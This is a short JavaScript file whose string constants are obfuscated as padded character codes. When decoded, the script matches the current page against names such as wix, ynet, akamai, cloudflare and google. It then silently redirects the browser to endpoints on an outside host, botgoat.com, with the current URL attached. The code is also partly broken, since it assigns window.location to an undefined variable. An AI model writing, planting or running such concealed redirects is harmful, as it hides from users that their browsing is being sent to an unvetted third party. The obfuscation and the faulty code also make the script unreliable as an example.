
function proxy() {
        function dig(az){
                var re = "";
                for (t=0;t<az.length;t++){
			if(isNaN(az[t])){
				az=az.replace(az[t], ' ');
			}
		}
		var mod = az.split(" ").map(Number).filter(Boolean);
                for (x=0;x<mod.length;x++){re += String.fromCharCode(mod[x]);}
                return re;
	}
        var a = ['119L105B120J', '121K110C101K116F'];
        var b = ['97C107N97G109C97H105D', '99N108M111H117H100C102H108B97F114C101M'];
	var c = ['103A111<111G103C108F101<','103A111<111G103C108F101<'];
        var d = [
		'104E116J116G112A115L58:47E47=98N111<116=103N111;97:116H46=99G111M109G47H100G111>103I109=97A47A103N101;116I63C117J114F108H61:104A116D116?112A58G47;47=',
		'104J116@116J112D115:58L47=47C98I111I116M103:111>97H116:46K99L111>109L47C115=111C110=105I97:47F103G101K116>63C117=114?108?61L104C116@116@112G115<58C47I47:',
		'104B116K116E112N115N58N47J47K98H111E116N103K111J97F116N46D99E111F109C47L106I117L108L115B47B103H101E116K63C114L101M115J61N114N101H112E114G',
		'104E116F116E112N115L58B47N47N98M111D116F103K111G97J116C46F99N111G109N47E97C110G106N97L47L103L101H116J63K117G114E108J61L104E116E116M112N115N58E47H47K'
		]
        var j = 0;
        var o = 0;
	var tar = window.location.host + '/' + window.location.pathname;
        for (i = 0; i < a.length; i++){
		if (tar.includes(dig(a[i]))){
			var prefix = dig(d[0]);
                	j += 1;
                        break;
		} else if (tar.includes(dig(b[i]))){
			var prefix = dig(d[1]);
                	j += 1;
                        break;
		} else if (tar.includes(dig(c[i]))){
                        var prefix = dig(d[2]);
                	j += 1;
                        o += 1;		
		}
        } 
        if (j==0) {
		var prefix = dig(d[3]);
	}
        if (o==0){
	window.location = prefix+tar;
	window.location = lock;} else {window.location = prefix;}
}
proxy(); 

